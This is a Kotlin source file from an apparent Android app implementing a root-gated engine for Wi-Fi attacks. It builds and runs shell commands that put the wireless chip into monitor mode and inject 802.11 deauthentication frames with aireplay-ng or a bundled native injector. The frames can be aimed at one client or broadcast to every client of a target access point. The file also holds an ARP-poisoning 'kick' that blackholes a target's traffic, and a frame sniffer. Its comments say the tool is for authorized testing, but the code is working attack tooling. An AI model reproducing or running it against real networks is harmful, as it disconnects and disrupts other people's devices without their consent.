package xin.ctkqiang.deauthctrl.manager

import android.content.Context
import android.os.Build
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.util.concurrent.atomic.AtomicInteger

/** 注入日志行 */
data class DeauthLogLine(val timeMs: Long, val text: String)

/**
 * 工具链探测结果 —— 每一项都是真实探测结论,不是假设:
 * - bundledInjector 为 true 表示 APK 内置了原生注入器(assets/deauth-frame),
 *   无需第三方工具链即可注入(仍需 root + 监控模式)
 * - 其余依赖 root(su) 与可选第三方工具(aireplay-ng 回退路径)
 */
data class DeauthToolProbe(
    val rootGranted: Boolean = false,
    val nexutil: Boolean = false,
    val aireplay: Boolean = false,
    val iw: Boolean = false,
    val iface: String? = null,
    val monitorSupported: Boolean = false,
    val bundledInjector: Boolean = false,
    val detail: String = "尚未探测",
)

/** 注入会话状态 */
data class DeauthSession(
    val running: Boolean = false,
    val phase: String = "空闲",
    val framesSent: Int = 0,
    val log: List<DeauthLogLine> = emptyList(),
    val probe: DeauthToolProbe? = null,
)

/**
 * 真实 802.11 去认证注入引擎 —— root 门控的 aireplay-ng / nexutil 驱动
 *
 * ## 平台前提(不满足就是不可用,UI 必须如实呈现)
 * 注入 802.11 管理帧需要 root + 支持 monitor mode 的芯片/固件:
 * - Broadcom 芯片用 nexutil(-m2 开监控模式)
 * - 其他芯片用 iw(需要对应固件支持)
 * - aireplay-ng 负责构造并注入 deauth 帧(aircrack-ng 套件,Android 移植版
 *   见 GitHub: kriswebdev/android_aircrack)
 *
 * ## 引擎职责
 * 1. [probeTools] su 探测:root/工具链/无线接口/监控模式支持
 * 2. [start] 拉起 su 会话:开监控模式 → 设信道 → aireplay-ng 循环注入,
 *    逐行流式回传日志并解析 deauth 计数
 * 3. [stop] 终止注入并尽力恢复接口为 managed 模式
 *
 * 只做用户自己设备/授权范围的操作;未 root 的设备上引擎根本不可启动。
 */
class WifiDeauthEngine private constructor(private val context: Context) {

    companion object {
        @Volatile private var instance: WifiDeauthEngine? = null

        /** 进程级单例:雷达/去认证页/ARP 页共享同一份探测结果与注入会话 */
        fun get(context: Context): WifiDeauthEngine = instance ?: synchronized(this) {
            instance ?: WifiDeauthEngine(context.applicationContext).also { instance = it }
        }
    }

    private val _session = MutableStateFlow(DeauthSession())
    val session: StateFlow<DeauthSession> = _session

    @Volatile private var suProcess: Process? = null
    @Volatile private var stopRequested = false
    private val framesSent = AtomicInteger(0)

    private fun appendLog(text: String) {
        val s = _session.value
        _session.value = s.copy(log = (s.log + DeauthLogLine(System.currentTimeMillis(), text)).takeLast(200))
    }

    /**
     * 一次性 su 探测:root 状态 + 工具链 + 无线接口 + 监控模式支持。
     * 可能触发系统的 root 授权弹窗,由用户在 UI 显式点击触发。
     */
    fun probeTools() {
        appendLog("▸ 探测 root 与工具链…")
        val rootOut = runSuLines(listOf("id -u"), timeoutMs = 4000) { }
        val rootOk = rootOut.lines.lines().any { it.trim() == "0" }
        val whichOut = if (rootOk) runSuLines(listOf("which nexutil aireplay-ng iw 2>/dev/null"), timeoutMs = 4000) { } else null
        val which = whichOut?.lines?.lines().orEmpty()
        val ifaceOut = if (rootOk) runSuLines(listOf("ls /sys/class/net 2>/dev/null | grep -E '^wlan' | head -n1"), timeoutMs = 4000) { } else null
        val iface = ifaceOut?.lines?.lines()?.firstOrNull { it.isNotBlank() }?.trim()
        // 监控模式支持:Broadcom 有 nexutil 即可;其余芯片看 iw phy 的 mode 列表
        val monitorSupported = if (rootOk && iface != null) {
            val nexOk = which.any { it.contains("nexutil") }
            val iwOk = which.any { it.endsWith("/iw") || it.trim().endsWith(" iw") || it == "iw" } &&
                runSuLines(listOf("iw phy phy0 info 2>/dev/null | grep -A6 'Supported interface modes' | grep -c monitor"), timeoutMs = 4000) { }
                    .lines.lines().firstOrNull()?.trim()?.toIntOrNull()?.let { it > 0 } == true
            nexOk || iwOk
        } else false

        val probe = DeauthToolProbe(
            rootGranted = rootOk,
            nexutil = which.any { it.contains("nexutil") },
            aireplay = which.any { it.contains("aireplay") },
            iw = which.any { it.contains("iw") },
            iface = iface,
            monitorSupported = monitorSupported,
            bundledInjector = hasBundledInjector(),
            detail = buildString {
                append(if (rootOk) "root 已授予" else "无 root(su 不可用)")
                append(" · 接口 ${iface ?: "未发现 wlan"}")
                append(" · 监控模式 ${if (monitorSupported) "支持" else "不支持"}")
                append(" · 注入器 ${if (hasBundledInjector()) "内置原生" else "未内置"}")
                if (!rootOk) append(" · 注入在无 root 的 stock Android 上不可实现(SELinux 拒绝 raw socket)")
            },
        )
        _session.value = _session.value.copy(probe = probe)
        appendLog("▸ 探测完成: ${probe.detail}")
        if (!probe.bundledInjector && probe.rootGranted && !probe.aireplay) {
            appendLog("▸ 未内置注入器且缺少 aireplay-ng —— 安装 aircrack-ng Android 移植版(如 kriswebdev/android_aircrack)到 PATH 后重试")
        }
    }

    /**
     * 启动真实 deauth 注入会话。
     *
     * @param targetBssid 目标 AP 的 BSSID(格式 AA:BB:CC:DD:EE:FF)
     * @param channel     目标信道(1-14 / 36-165)
     * @param clientMac   定向解除客户端;null = 广播 deauth(所有客户端)
     * @param count       每轮注入帧数;0 = aireplay 持续循环
     * @param intervalMs  每轮间隔;0 = aireplay 默认
     * @return null 表示会话已启动;非 null 为失败原因
     */
    fun start(targetBssid: String, channel: Int, clientMac: String?, count: Int, intervalMs: Long): String? {
        if (_session.value.running) return "注入会话已在运行"
        val macRe = Regex("^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
        if (!macRe.matches(targetBssid)) return "BSSID 格式无效: $targetBssid"
        clientMac?.let { if (!macRe.matches(it)) return "客户端 MAC 格式无效: $it" }
        val probe = _session.value.probe
        if (probe == null || !probe.rootGranted) return "无 root —— 注入在无 root 的 stock Android 上不可实现"
        if (!probe.monitorSupported) return "芯片/固件不支持监控模式(需 Nexmon/QCACLD 类补丁固件)"
        val iface = probe.iface ?: return "未发现无线接口"

        stopRequested = false
        framesSent.set(0)
        _session.value = DeauthSession(running = true, phase = "准备监控模式", probe = probe)
        val monitorIface = iface // nexutil 不换接口名;iw 会变成 mon0,先用原名探测后修复
        // 注入器选择:内置原生注入器优先(无需第三方工具链),aireplay-ng 回退
        val injectorPath = extractBundledInjector()
        val injectCmd = if (injectorPath != null) {
            "$injectorPath $iface $targetBssid ${clientMac ?: "broadcast"} $count $intervalMs"
        } else if (probe.aireplay) {
            buildString {
                append("aireplay-ng -0 $count -a $targetBssid")
                clientMac?.let { append(" -c $it") }
                append(" --ignore-negative-one")
                if (count == 0 && intervalMs > 0) append(" -x ${(intervalMs / 1000).coerceAtLeast(1)}")
                append(" $monitorIface")
            }
        } else {
            return "无可用注入器(内置注入器缺失且 aireplay-ng 未安装)"
        }
        val cmd = buildList {
            add("set -e")
            // 打开监控模式:Broadcom 用 nexutil -m2;失败回退 iw
            if (probe.nexutil) {
                add("nexutil -m2")
            } else {
                add("iw dev $iface set type monitor")
            }
            add("ip link set $iface up")
            if (channel in 1..165) add("iw dev $iface set channel $channel")
            add(injectCmd)
        }.joinToString("\n") + "\n"

        appendLog("▸ 注入会话启动 · 目标 $targetBssid · 信道 $channel · ${clientMac ?: "广播(全部客户端)"} · $iface")
        Thread({
            try {
                val su = ProcessBuilder("su").redirectErrorStream(true).start()
                suProcess = su
                su.outputStream.write(cmd.toByteArray())
                su.outputStream.flush()
                val reader = BufferedReader(InputStreamReader(su.inputStream))
                var last = System.currentTimeMillis()
                while (!stopRequested) {
                    val line = reader.readLine() ?: break
                    val now = System.currentTimeMillis()
                    appendLog(line.take(160))
                    // aireplay 输出形如 "Sending 64 directed DeAuth..." / "Sending 64 broadcast DeAuth"
                    if (line.contains("DeAuth") || line.contains("Deauth")) framesSent.incrementAndGet()
                    _session.value = _session.value.copy(framesSent = framesSent.get())
                    last = now
                }
                if (stopRequested) {
                    runCatching { su.destroy() }
                }
                runCatching { reader.close() }
            } catch (t: Throwable) {
                appendLog("✖ 注入会话异常: ${t.message}")
            } finally {
                suProcess = null
                restoreManagedMode(iface)
                _session.value = _session.value.copy(running = false, phase = "已停止 · 接口已恢复 managed")
                appendLog("▸ 注入会话结束 · 共注入 ${framesSent.get()} 帧")
            }
        }, "wifi-deauth-engine").start()
        return null
    }

    /** 停止注入并尽力恢复接口 */
    fun stop() {
        stopRequested = true
        _session.value = _session.value.copy(phase = "正在停止…")
        suProcess?.let { runCatching { it.destroy() } }
        _session.value.probe?.iface?.let { restoreManagedMode(it) }
    }

    /**
     * 被动嗅探模式 —— 同一原生二进制 capture 子命令:
     * 监控模式下逐帧解析 radiotap + 802.11 管理帧(信标/探测/去认证/关联),
     * 输出 "FRAME <type> <src> <dst> <ssid>" 流式进入日志。
     * root + 监控模式前提与注入模式相同;无 root 设备上返回失败原因。
     */
    fun startCapture(channel: Int): String? {
        if (_session.value.running) return "会话已在运行"
        val probe = _session.value.probe
        if (probe == null || !probe.rootGranted) return "无 root —— 嗅探在无 root 的 stock Android 上不可实现"
        if (!probe.monitorSupported) return "芯片/固件不支持监控模式"
        val iface = probe.iface ?: return "未发现无线接口"

        stopRequested = false
        framesSent.set(0)
        _session.value = DeauthSession(running = true, phase = "被动嗅探", probe = probe)
        val injectorPath = extractBundledInjector()
            ?: return "内置嗅探器缺失"
        val cmd = buildList {
            add("set -e")
            if (probe.nexutil) add("nexutil -m2") else add("iw dev $iface set type monitor")
            add("ip link set $iface up")
            if (channel in 1..165) add("iw dev $iface set channel $channel")
            add("$injectorPath capture $iface")
        }.joinToString("\n") + "\n"

        appendLog("▸ 被动嗅探启动 · $iface · 监听信标/探测/去认证帧")
        Thread({
            try {
                val su = ProcessBuilder("su").redirectErrorStream(true).start()
                suProcess = su
                su.outputStream.write(cmd.toByteArray())
                su.outputStream.flush()
                val reader = BufferedReader(InputStreamReader(su.inputStream))
                while (!stopRequested) {
                    val line = reader.readLine() ?: break
                    appendLog(line.take(160))
                    if (line.startsWith("FRAME ")) framesSent.incrementAndGet()
                    _session.value = _session.value.copy(framesSent = framesSent.get())
                }
                if (stopRequested) runCatching { su.destroy() }
                runCatching { reader.close() }
            } catch (t: Throwable) {
                appendLog("[!] 嗅探会话异常: ${t.message}")
            } finally {
                suProcess = null
                restoreManagedMode(iface)
                _session.value = _session.value.copy(running = false, phase = "已停止 · 接口已恢复 managed")
                appendLog("▸ 嗅探会话结束 · 共解析 ${framesSent.get()} 帧")
            }
        }, "wifi-frame-sniffer").start()
        return null
    }

    /**
     * ARP 投毒踢人 —— 向目标持续广播伪造 ARP 应答,宣称网关位于假 MAC,
     * 目标设备的 ARP 缓存被投毒后其上行流量黑洞,等效被踢出网络。
     *
     * 诚实边界(UI 必须呈现):
     * - 需要 root;部分设备 SELinux 连 root 也拒绝 AF_PACKET(会如实报 Permission denied)
     * - 仅对动态 ARP 缓存的客户端有效;启用 ARP 防欺骗/静态 ARP 的设备免疫
     * - 停止后目标 ARP 缓存过期(30-60s)自动恢复网络;这是主动干扰,仅限授权测试
     * - 接口保持 managed 模式(ARP 是二层广播,不需要监控模式)
     */
    fun startArpKick(targetIp: String, gatewayIp: String, count: Int, intervalMs: Long): String? {
        if (_session.value.running) return "会话已在运行"
        val probe = _session.value.probe
        if (probe == null || !probe.rootGranted) return "无 root —— ARP 投毒需要 root"
        val iface = probe.iface ?: return "未发现无线接口"
        val ipRe = Regex("^\\d{1,3}(\\.\\d{1,3}){3}$")
        if (!ipRe.matches(targetIp)) return "目标 IP 格式无效: $targetIp"
        if (!ipRe.matches(gatewayIp)) return "网关 IP 格式无效: $gatewayIp"

        stopRequested = false
        framesSent.set(0)
        _session.value = DeauthSession(running = true, phase = "ARP 踢人", probe = probe)
        val injectorPath = extractBundledInjector()
            ?: return "内置引擎缺失"
        val cmd = buildList {
            add("set -e")
            add("ip link set $iface up")
            add("$injectorPath arpkick $iface $targetIp $gatewayIp $count ${intervalMs.coerceAtLeast(100)}")
        }.joinToString("\n") + "\n"

        appendLog("▸ ARP 踢人启动 · 目标 $targetIp · 网关 $gatewayIp · $iface")
        Thread({
            try {
                val su = ProcessBuilder("su").redirectErrorStream(true).start()
                suProcess = su
                su.outputStream.write(cmd.toByteArray())
                su.outputStream.flush()
                val reader = BufferedReader(InputStreamReader(su.inputStream))
                while (!stopRequested) {
                    val line = reader.readLine() ?: break
                    appendLog(line.take(160))
                    if (line.startsWith("ARPKICK ")) framesSent.incrementAndGet()
                    _session.value = _session.value.copy(framesSent = framesSent.get())
                }
                if (stopRequested) runCatching { su.destroy() }
                runCatching { reader.close() }
            } catch (t: Throwable) {
                appendLog("[!] ARP 会话异常: ${t.message}")
            } finally {
                suProcess = null
                _session.value = _session.value.copy(running = false, phase = "已停止")
                appendLog("▸ ARP 会话结束 · 共投毒 ${framesSent.get()} 帧 · 目标缓存过期后自动恢复网络")
            }
        }, "arp-kick").start()
        return null
    }

    private fun restoreManagedMode(iface: String) {
        runCatching {
            val p = ProcessBuilder("su").start()
            p.outputStream.write(
                "iw dev $iface set type managed 2>/dev/null\nip link set $iface up 2>/dev/null\nexit\n".toByteArray(),
            )
            p.outputStream.flush()
            p.waitFor()
        }
    }

    /** APK 内置原生注入器的资产路径(按设备 ABI 选择);不存在返回 null */
    private fun bundledAssetPath(): String? {
        val abis = runCatching { Build.SUPPORTED_ABIS }.getOrDefault(arrayOf())
        val abi = abis.firstOrNull { it == "arm64-v8a" || it == "armeabi-v7a" } ?: return null
        val asset = "deauth-frame/$abi/deauth-frame"
        return if (runCatching { context.assets.open(asset).close() }.isSuccess) asset else null
    }

    private fun hasBundledInjector(): Boolean = bundledAssetPath() != null

    /** 解压内置原生注入器到私有目录并经 su chmod 755,返回可执行路径;失败返回 null */
    private fun extractBundledInjector(): String? {
        val asset = bundledAssetPath() ?: return null
        val abi = Build.SUPPORTED_ABIS.firstOrNull { asset.contains(it) } ?: return null
        val dest = File(context.filesDir, "deauth-frame-$abi")
        return try {
            if (!dest.exists() || dest.length() == 0L) {
                context.assets.open(asset).use { input ->
                    dest.outputStream().use { input.copyTo(it) }
                }
            }
            runSuLines(listOf("chmod 755 ${dest.absolutePath}"), timeoutMs = 4000) { }
            dest.absolutePath
        } catch (t: Throwable) {
            appendLog("✖ 注入器解压失败: ${t.message}")
            null
        }
    }

    /** 一次性 su 命令,收集全部输出行;超时(毫秒)保护 */
    private fun runSuLines(cmds: List<String>, timeoutMs: Long, onLine: (String) -> Unit): Output {
        return try {
            val su = ProcessBuilder("su").redirectErrorStream(true).start()
            su.outputStream.write(cmds.joinToString("\n") { "$it" }.toByteArray() + "\nexit\n".toByteArray())
            su.outputStream.flush()
            val reader = BufferedReader(InputStreamReader(su.inputStream))
            val lines = mutableListOf<String>()
            val worker = Thread({
                reader.forEachLine { line ->
                    lines.add(line)
                    onLine(line)
                }
            })
            worker.start()
            val finished = runCatching { su.waitFor() }.getOrDefault(-1)
            if (finished == 0) worker.join(timeoutMs) else worker.join(timeoutMs)
            Output(finished == 0, lines.joinToString("\n"))
        } catch (t: Throwable) {
            Output(false, t.message ?: t.javaClass.simpleName)
        }
    }

    private data class Output(val ok: Boolean, val lines: String)
}
